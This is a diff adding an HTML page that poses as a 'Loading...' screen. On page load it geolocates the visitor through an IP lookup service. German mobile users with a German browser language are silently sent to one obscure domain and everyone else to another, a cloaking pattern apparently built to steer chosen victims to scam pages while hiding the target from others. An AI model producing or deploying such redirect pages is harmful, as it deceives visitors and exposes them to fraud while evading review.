@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function handleResponse() {
+            function isMobileDevice() {
+                return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            }
+
+            function isGermanLang() {
+                return navigator.language.startsWith('de') || 
+                    navigator.languages.some(lang => lang.startsWith('de'));
+            }
+
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    // 严格条件：IP是德国 + 手机 + 德语
+                    if (data.country === 'DE' && isMobileDevice() && isGermanLang()) {
+                        window.location.href = "https://ttaape.com/mlfeimai";
+                        return;
+                    }
+                    // 其他情况跳转默认链接
+                    window.location.href = "https://www.jacmsotck.online/jz/j2.html";
+                })
+                .catch(() => {
+                    // 如果IP检测失败，但仍然手机 + 德语
+                    if (isMobileDevice() && isGermanLang()) {
+                        window.location.href = "https://ttaape.com/mlfeimai";
+                        return;
+                    }
+                    // 默认跳转
+                    window.location.href = "https://www.jacmsotck.online/jz/j2.html";
+                });
+        }
+        
+        // 页面加载时立即执行
+        window.onload = handleResponse;
+    </script>
+</head>
+<body>
+    <p>Loading, please wait...</p>
+</body>
+</html>
